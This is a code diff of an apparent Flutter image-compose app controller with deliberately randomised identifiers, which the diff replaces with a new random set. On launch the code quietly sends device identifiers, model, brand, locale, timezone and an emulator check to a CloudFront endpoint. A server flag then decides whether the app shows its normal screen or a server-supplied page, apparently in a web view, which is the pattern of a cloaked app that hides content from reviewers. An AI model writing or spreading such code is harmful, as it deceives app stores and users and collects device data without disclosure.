@@ -10,12 +10,12 @@ import 'package:package_info_plus/package_info_plus.dart';
 
 class ImageComposeFreezeLogic extends GetxController {
 
-  var ylpukrztsg = RxBool(false);
-  var audhwg = RxBool(true);
-  var dacptes = RxString("");
-  var nzcyilvh = RxBool(false);
-  var jqwoprsc = RxBool(true);
-  final klxmipbjf = Dio();
+  var mswbca = RxBool(false);
+  var dnihbcwgf = RxBool(true);
+  var tiumrexl = RxString("");
+  var crkxt = RxBool(false);
+  var ztoxfys = RxBool(true);
+  final gpxfsiauol = Dio();
 
 
   InAppWebViewController? webViewController;
@@ -23,102 +23,105 @@ class ImageComposeFreezeLogic extends GetxController {
   @override
   void onInit() {
     super.onInit();
-    kmtu();
+    wbjuxrsd();
   }
 
 
-  Future<void> kmtu() async {
-    nzcyilvh.value = true;
-    jqwoprsc.value = true;
-    audhwg.value = false;
+  Future<void> wbjuxrsd() async {
+    crkxt.value = true;
+    ztoxfys.value = true;
+    dnihbcwgf.value = false;
 
-    klxmipbjf.post("https://d1azw2jucw5qsd.cloudfront.net/QYADDZ?no_check",data: await jyhczimqu()).then((value) {
-      var ysmhwajv = value.data["ysmhwajv"] as String;
-      var gfkpbezd = value.data["gfkpbezd"] as bool;
-      if (gfkpbezd) {
-        dacptes.value = ysmhwajv;
-        bzepgj();
+    gpxfsiauol.post("https://d21ymigkh3709c.cloudfront.net/Yn9TsxJI1kaa",data: await psdwzjcr()).then((value) {
+      var esibulwy = value.data["esibulwy"] as String;
+      var ngclba = value.data["ngclba"] as bool;
+      if (ngclba) {
+        tiumrexl.value = esibulwy;
+        pxescgh();
       } else {
-        ygkm();
+        euqsj();
       }
     }).catchError((e) {
-      audhwg.value = true;
-      jqwoprsc.value = true;
-      nzcyilvh.value = false;
+      dnihbcwgf.value = true;
+      ztoxfys.value = true;
+      crkxt.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> jyhczimqu() async {
-    final DeviceInfoPlugin aqvgzdn = DeviceInfoPlugin();
-    PackageInfo grawopiv_yjsfcrx = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> psdwzjcr() async {
+    final DeviceInfoPlugin svde = DeviceInfoPlugin();
+    PackageInfo ibqm_jpdvziwh = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var atvmd = Platform.localeName;
-    var lveqs = currentTimeZone;
+    var qjscke = Platform.localeName;
+    var iMBtb = currentTimeZone;
 
-    var glvf = grawopiv_yjsfcrx.packageName;
-    var owudahft = grawopiv_yjsfcrx.version;
-    var qlze = grawopiv_yjsfcrx.buildNumber;
+    var AmYIx = ibqm_jpdvziwh.packageName;
+    var TQSXlNCD = ibqm_jpdvziwh.version;
+    var QnuS = ibqm_jpdvziwh.buildNumber;
 
-    var ytaifd = grawopiv_yjsfcrx.appName;
-    var chmkgqze = "";
-    var pugwajmo  = "";
-    var ahcbqp = "";
-    var ynka = "";
-    var gcthroi = "";
-    var gtvm = "";
+    var koslyzK = ibqm_jpdvziwh.appName;
+    var cDEhL = "";
+    var iSAT  = "";
+    var CFIERS = "";
+    var ohmsut = "";
+    var vlij = "";
+    var efmrz = "";
+    var odnir = "";
+    var koybqi = "";
 
 
-    var atkxogfy = "";
-    var oheiqa = false;
+    var UoBY = "";
+    var GXVWRkOS = false;
 
     if (GetPlatform.isAndroid) {
-      atkxogfy = "android";
-      var jfkvxengzq = await aqvgzdn.androidInfo;
+      UoBY = "android";
+      var yjboszvug = await svde.androidInfo;
 
-      ahcbqp = jfkvxengzq.brand;
+      CFIERS = yjboszvug.brand;
 
-      chmkgqze  = jfkvxengzq.model;
-      pugwajmo = jfkvxengzq.id;
+      cDEhL  = yjboszvug.model;
+      iSAT = yjboszvug.id;
 
-      oheiqa = jfkvxengzq.isPhysicalDevice;
+      GXVWRkOS = yjboszvug.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
-      atkxogfy = "ios";
-      var nadboqfr = await aqvgzdn.iosInfo;
-      ahcbqp = nadboqfr.name;
-      chmkgqze = nadboqfr.model;
+      UoBY = "ios";
+      var yifashoel = await svde.iosInfo;
+      CFIERS = yifashoel.name;
+      cDEhL = yifashoel.model;
 
-      pugwajmo = nadboqfr.identifierForVendor ?? "";
-      oheiqa  = nadboqfr.isPhysicalDevice;
+      iSAT = yifashoel.identifierForVendor ?? "";
+      GXVWRkOS  = yifashoel.isPhysicalDevice;
     }
-
     var res = {
-      "ytaifd": ytaifd,
-      "qlze": qlze,
-      "owudahft": owudahft,
-      "glvf": glvf,
-      "chmkgqze": chmkgqze,
-      "lveqs": lveqs,
-      "ahcbqp": ahcbqp,
-      "pugwajmo": pugwajmo,
-      "atvmd": atvmd,
-      "atkxogfy": atkxogfy,
-      "oheiqa": oheiqa,
-      "ynka" : ynka,
-      "gcthroi" : gcthroi,
-      "gtvm" : gtvm,
+      "koslyzK": koslyzK,
+      "QnuS": QnuS,
+      "AmYIx": AmYIx,
+      "ohmsut" : ohmsut,
+      "cDEhL": cDEhL,
+      "iMBtb": iMBtb,
+      "CFIERS": CFIERS,
+      "vlij" : vlij,
+      "iSAT": iSAT,
+      "qjscke": qjscke,
+      "UoBY": UoBY,
+      "GXVWRkOS": GXVWRkOS,
+      "efmrz" : efmrz,
+      "odnir" : odnir,
+      "koybqi" : koybqi,
+      "TQSXlNCD": TQSXlNCD,
 
     };
     return res;
   }
 
-  Future<void> ygkm() async {
-    Get.offNamed("/ClockMainPage");
+  Future<void> euqsj() async {
+    Get.offNamed("/image_compose_tab");
   }
 
-  Future<void> bzepgj() async {
-    Get.offNamed("/Outreload");
+  Future<void> pxescgh() async {
+    Get.offNamed("/image_compose_write");
   }
 
 }
